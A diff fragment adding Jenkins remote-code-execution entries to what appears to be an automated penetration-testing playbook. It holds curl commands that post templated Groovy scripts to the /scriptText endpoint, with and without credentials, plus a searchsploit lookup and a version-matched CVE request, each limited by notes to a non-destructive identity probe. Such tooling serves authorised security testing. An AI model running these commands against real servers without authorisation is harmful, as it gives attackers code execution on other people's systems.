+  _family: rce-jenkins
+- id: jenkins-credentialed-scripttext-rce
+  name: Credentialed Jenkins scriptText identity probe
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: 'curl -sS --max-time 20 -u "{{user}}:{{credential}}" -b "{{jenkins_cookie}}"
+    -H "Jenkins-Crumb: {{jenkins_crumb}}" -X POST "{{scheme}}://{{host}}:{{port}}/scriptText"
+    --data-urlencode "script={{groovy_command_probe}}"'
+  parallel_safe: false
+  blast_radius: high
+  operator: ''
+  confirms:
+  - have_cred
+  - cred_grants
+  - tool
+  verify:
+    success_if: exit_code == 0 && stdout matches 'uid=[0-9]+'
+    emits:
+    - rce_as
+  cost_hint: cheap
+  notes: use a harmless identity probe and retain no returned command output
+  _family: rce-jenkins
+- id: jenkins-unauth-scripttext-rce
+  name: Unauthenticated Jenkins scriptText identity probe
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: curl -sS --max-time 20 -X POST "{{scheme}}://{{host}}:{{port}}/scriptText"
+    --data-urlencode "script={{groovy_command_probe}}"
+  parallel_safe: false
+  blast_radius: high
+  operator: ''
+  confirms:
+  - tool
+  verify:
+    success_if: exit_code == 0 && stdout matches 'uid=[0-9]+'
+    emits:
+    - rce_as
+  cost_hint: cheap
+  notes: treat unauthenticated execution as critical and stop after proof
+  _family: rce-jenkins
+- id: jenkins-version-cve-lead
+  name: Jenkins version-to-public-exploit lead
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: jenkins
+  tool: searchsploit
+  invocation: searchsploit "Jenkins {{jenkins_version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Jenkins'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: 'lead only: correlate version and access prerequisites before selecting a
+    candidate'
+  _family: rce-jenkins
+- id: jenkins-unauth-cve-rce-probe
+  name: Version-matched unauthenticated Jenkins CVE identity probe
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: curl -sS --max-time 20 -X {{cve_http_method}} "{{scheme}}://{{host}}:{{port}}{{cve_path}}"
+    -H "{{cve_content_type_header}}" --data-binary "{{cve_request_body}}"
+  parallel_safe: false
+  blast_radius: high
+  operator: run-public-exploit
+  confirms:
+  - vuln_present
+  - known_exploit
+  - runs_as
+  verify:
+    success_if: exit_code == 0 && stdout matches 'uid=[0-9]+'
+    emits:
+    - rce_as
+  cost_hint: moderate
+  notes: use only a version-matched non-destructive proof request and halt after identity
+    output
+  _family: rce-jenkins
